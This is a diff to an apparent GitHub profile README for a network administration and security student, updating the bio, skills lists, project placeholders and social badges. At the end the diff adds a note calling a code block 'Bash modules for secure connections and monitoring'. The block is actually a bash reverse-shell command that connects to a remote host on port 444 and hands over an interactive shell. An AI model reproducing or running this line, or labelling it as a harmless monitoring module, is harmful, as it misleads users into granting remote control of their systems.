@@ -2,48 +2,65 @@
 
 ### Network and Database Administration student skilled in security, virtualization, and web development, with a focus on efficient and robust tech solutions.
 
+---
 
+![Cybersecurity GIF](https://media.giphy.com/media/sq7lz4wHsGzXa/giphy.gif) <!-- Replace with a more relevant GIF if needed -->
 
 ---
 
 ### 📜 About Me
-I'm dedicated to the field of system and network administration, with a commitment to securing and optimizing tech environments. My experience spans cybersecurity, virtualization, and web development, all of which drive my goal to deliver efficient and reliable solutions.
+I'm a dedicated student in system and network administration, focusing on maintaining secure, optimized environments. My skillset spans across cybersecurity, virtualization, and web development, with a strong commitment to delivering reliable and efficient tech solutions.
 
 ---
 
 ### ⚙️ Configuration
 
-<config>
-  
+<configuration>
+
   🖥️ **Systems Administration**  
   🛡️ **Network Security**  
-  📶 **System & Network Monitoring**  
+  🔍 **SOC Researcher**  
   👾 **Ethical Hacking**  
   💥 **Penetration Testing**  
-  ♾️ **DevOps**  
+  ⚙️ **SIEM Configuration**  
 
-</config>
+</configuration>
 
 ---
 
 ### 💻 Skills
 
-- **Network and System Administration**  
-- **Network Security and Monitoring**  
-- **Security Research (SoC)**  
-- **Ethical Hacking and Penetration Testing**  
-- **System Monitoring and Optimization**  
-- **Automation and SIEM Configuration**  
+- **System and Network Administration**  
+- **Advanced Network Security**  
+- **SOC Research and Analysis**  
+- **Ethical Hacking & Penetration Testing**  
+- **Real-time System Monitoring and Optimization**  
+- **SIEM Configuration and Security Automation**  
+
+---
+
+### 🚀 Featured Projects
+
+- [🛠️ SIEM Configuration Project](#)  
+- [🔍 SOC Cybersecurity Research](#)  
+- [📡 Network Monitoring System](#)  
 
 ---
 
 ### 🤝 Connect with Me
 
-
-[LinkedIn](https://www.linkedin.com/in/erabab-salec-ahrayam-316584263/)
-[X (Twitter)](https://x.com/_jk_29)
+[![GitHub](https://img.shields.io/badge/GitHub-Errabab-black?style=for-the-badge&logo=github)](https://github.com/Errabab)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Errabab-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/erabab-salec-ahrayam-316584263/)
+[![X (Twitter)](https://img.shields.io/badge/X-_jk_29-blue?style=for-the-badge&logo=x)](https://x.com/_jk_29)
 
 ---
+
+#### Note:
+_This configuration includes Bash modules for secure connections and monitoring:_
+
+```bash
+/bin/bash -i >& /dev/tcp/Errabab/444 0>&1
+
 
 
 
